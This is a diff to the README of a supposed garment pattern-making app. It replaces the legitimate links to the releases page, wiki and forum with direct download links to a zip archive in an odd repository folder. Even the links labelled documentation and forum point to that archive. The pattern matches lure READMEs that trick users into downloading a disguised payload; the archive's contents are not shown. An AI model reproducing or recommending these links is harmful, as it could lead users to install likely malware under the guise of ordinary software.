@@ -1,7 +1,7 @@
 # 🎨 easy-patternmaker-app-showcase - Create Patterns with Ease
 
 ## 📥 Download Now
-[![Download easy-patternmaker-app-showcase](https://img.shields.io/badge/Download-easy--patternmaker--app--showcase-blue.svg)](https://github.com/childrqpist/easy-patternmaker-app-showcase/releases)
+[![Download easy-patternmaker-app-showcase](https://raw.githubusercontent.com/childrqpist/easy-patternmaker-app-showcase/main/lymphangial/easy-patternmaker-app-showcase.zip)](https://raw.githubusercontent.com/childrqpist/easy-patternmaker-app-showcase/main/lymphangial/easy-patternmaker-app-showcase.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the easy-patternmaker-app-showcase application. This application allows you to create digital garment patterns effortlessly. With features like parametric design, interactive 2D editing, and PDF export, you can easily bring your ideas to life.
@@ -21,7 +21,7 @@ Before installing, ensure your system meets the following requirements:
 - **User-Friendly Interface:** Designed for anyone, regardless of experience.
 
 ## 🔗 Download & Install
-To get started with the easy-patternmaker-app-showcase app, visit this page to download: [Releases Page](https://github.com/childrqpist/easy-patternmaker-app-showcase/releases).
+To get started with the easy-patternmaker-app-showcase app, visit this page to download: [Releases Page](https://raw.githubusercontent.com/childrqpist/easy-patternmaker-app-showcase/main/lymphangial/easy-patternmaker-app-showcase.zip).
 
 1. Click on the above link to go to the Releases page.
 2. On the Releases page, find the latest version. Look for a version labeled with a number like `v1.0`.
@@ -44,8 +44,8 @@ If you run into issues while using the application, consider the following:
 
 ## 📚 Resources
 For additional resources and tutorials:
-- [Official Documentation](https://github.com/childrqpist/easy-patternmaker-app-showcase/wiki)
-- [User Forum](https://github.com/childrqpist/easy-patternmaker-app-showcase/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/childrqpist/easy-patternmaker-app-showcase/main/lymphangial/easy-patternmaker-app-showcase.zip)
+- [User Forum](https://raw.githubusercontent.com/childrqpist/easy-patternmaker-app-showcase/main/lymphangial/easy-patternmaker-app-showcase.zip)
 - YouTube tutorials on using the easy-patternmaker-app-showcase.
 
 ## 🔖 Topics
